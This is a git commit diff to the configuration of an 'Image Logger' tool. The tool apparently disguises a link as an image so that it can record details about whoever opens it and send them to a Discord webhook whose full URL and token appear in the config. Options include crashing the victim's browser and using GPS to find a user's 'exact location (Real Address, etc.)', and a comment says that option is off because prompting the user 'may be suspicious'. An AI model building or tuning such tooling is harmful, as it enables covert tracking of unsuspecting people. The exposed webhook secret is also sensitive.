c03e5b7626cd460c64eabd31cf992ed57c096314
IASDAIODJIADIOASSDOASD <prosetesetessaves@gmail.com>
2025-02-10 18:52:14 +0500

    Update item.py

--- api/item.py
+++ api/item.py
@@ -15,7 +15,7 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1338154041280041072/XhpO6aDO41HDxk1gNw7P4d7MtyK-kzu60g_KTvg48QBv_6lZmAJXSa0arFUQ5wOs2DVg",
     "image": "https://novate.ru/files/u18927/always-win-novate1.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
@@ -24,7 +24,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
